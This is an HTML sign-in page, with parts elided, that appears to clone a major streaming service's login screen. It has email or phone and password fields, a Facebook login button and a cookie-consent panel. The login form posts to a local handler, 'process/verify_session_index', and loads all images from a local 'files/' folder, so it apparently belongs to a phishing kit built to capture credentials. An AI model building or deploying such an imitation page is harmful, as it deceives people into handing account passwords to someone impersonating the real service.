...
<head>
	...
	<link type="text/css" rel="stylesheet" href="files/none1.css" data-uia="botLink">
...
<body>
	<div id="appMountPoint">
		<div class="login-wrapper hybrid-login-wrapper">
			<div class="login-wrapper-background"><img class="concord-img vlv-creative" src="files/US-en-20220207-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="files/US-en-20220207-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, files/US-en-20220207-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, files/US-en-20220207-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt=""></div>
			<div class="nfHeader login-header signupBasicHeader"><br>
				...
				<div>
					...
					<div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
						<div class="hybrid-login-form-main">
							...
							<form method="post" class="login-form" action="process/verify_session_index">
									...
									<div class="nfInputPlacement">
										<div class="nfEmailPhoneControls">
											<label class="input_id" placeholder="">
												<input type="text" data-uia="login-field" required="true" placeholder="Email or phone number" name="username" class="nfTextField" id="username" value="" tabindex="0" autocomplete="email" dir="">
												<label for="id_userLoginId" class="placeLabel"></label>
											</label>
											<div data-uia="phone-country-selector+container" class="ui-select-wrapper country-select">
												<a data-uia="phone-country-selector+target" href="#" class="ui-select-wrapper-link">
													<div class="ui-select-current" placeholder="{&quot;current_selected_country&quot;:&quot;US&quot;}"><span class="country-select-flag nf-flag nf-flag-us"></span><span class="country-select-code">+<!-- -->1</span></div>
												</a>
								...
								<div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password">
									<div class="nfInputPlacement">
										<div class="nfPasswordControls">
											<label class="input_id" placeholder="">
												<input type="password" data-uia="password-field" placeholder="Password" required="true" name="password" class="nfTextField" id="password" value="" tabindex="0" autocomplete="password" dir="">
												<label for="id_password" class="placeLabel"></label>
											</label>
								...
								<div class="hybrid-login-form-help">
									...
									</div><a class="link login-help-link" target="_self" data-uia="login-help-link">Need help?</a></div>
								...
								<input type="hidden" name="authURL" value="1644772789839.7q1rDoP/S29Oh21v4uK81dPBGPc=">
								...
								<div class="facebookForm regOption">
									<div class="fb-minimal">
										...
										<button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0" data-uia="">
											<div class="fb-login" data-uia="fb-login"><img class="icon-facebook" src="files/FB-f-Logo__blue_57.png"><span class="fbBtnText">Login with Facebook</span></div>
										</button>
									</div>
								</div>
								<input type="hidden" name="flow" value="websiteSignUp">
							...
							<ul class="category-group">
								<li class="category-item ot-always-active-group" data-optanongroupid="C0001">
									...
									<div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001">
											...
											<div class="ot-toggle-group">
												...
												<div class="ot-toggle ot-hide-tgl">
													<div class="checkbox">
														...
														<label for="ot-group-id-C0001"><span class="label-text">Essential Cookies</span></label>
														<!-- DYNAMICALLY GENERATE Input ID  -->
													</div>
												</div>
											</div>
										...
										<!-- sub groups -->
										<div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0001">Cookies Details&lrm;</a></div>
									</div>
								</li>
								<li class="category-item ot-always-active-group" data-optanongroupid="C0002">
									...
									<div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0002">
											...
											<div class="ot-toggle-group">
												...
												<div class="ot-toggle ot-hide-tgl">
													<div class="checkbox">
														...
														<label for="ot-group-id-C0002"><span class="label-text">Performance and Functionality Cookies</span></label>
														<!-- DYNAMICALLY GENERATE Input ID  -->
													</div>
												</div>
											</div>
										...
										<!-- sub groups -->
										<div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0002">Cookies Details&lrm;</a></div>
									</div>
								</li>
							</ul>
						</div>
									...
									<div id="select-all-container">
										<div class="ot-checkbox">
											...
											<div id="select-all-vendors-leg-input-container">
												...
												<label for="select-all-vendor-leg-handler"><span class="label-text">Select All Vendors</span></label>
											</div>
											...
											<div id="select-all-hosts-input-container">
												...
												<label for="select-all-hosts-groups-handler"><span class="label-text">Select All Hosts</span></label>
											</div>
                                ...
                                c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path>
												...
												<div class="ot-toggle-group">
													...
													<div class="ot-checkbox">
														...
														<label for="REPLACE-WITH-DYANMIC-VENDOR-ID1"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label>
													</div>
													<!-- Checkbox END -->
												</div>
											</section>
